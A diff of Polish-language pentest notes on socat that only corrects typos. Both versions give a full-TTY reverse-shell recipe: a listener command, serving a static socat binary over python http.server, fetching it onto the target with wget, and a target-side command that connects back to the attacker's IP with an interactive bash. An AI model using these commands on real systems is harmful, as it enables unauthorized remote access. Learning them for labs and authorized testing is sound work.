@@ -19,7 +19,7 @@ To na naszym komputerze żeby się połączyć `socat TCP:<TARGET-IP>:<TARGET-PO
 
 # W pełni stabilny tty rev shell
 
-```socat TCP-L:<port> FILE:`tty`,raw,echo=0``` - to tego listenera można się połączyć z dowolnym payloadem ale żęby to zadziałało trzeba wysłać do celu [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) raczej robi się to hostując `python3 -m http.server 80` i dalej pobierając na celu `wget <LOCAL-IP>/socat -O /tmp/socat`
+```socat TCP-L:<port> FILE:`tty`,raw,echo=0``` - do tego listenera można się połączyć z dowolnym payloadem ale żeby to zadziałało trzeba wysłać do celu [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) raczej robi się to hostując `python3 -m http.server 80` i dalej pobierając na celu `wget <LOCAL-IP>/socat -O /tmp/socat`
 Na tym komputerze (celu) trzeba wpisać to: `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`i to działa tak:
 - EXEC:"bash -li" tworzy ineraktywną sesję bash. dalej argumenty:
   - pty - alokuje pseudoterminal na celu - część procesu stabilizacji
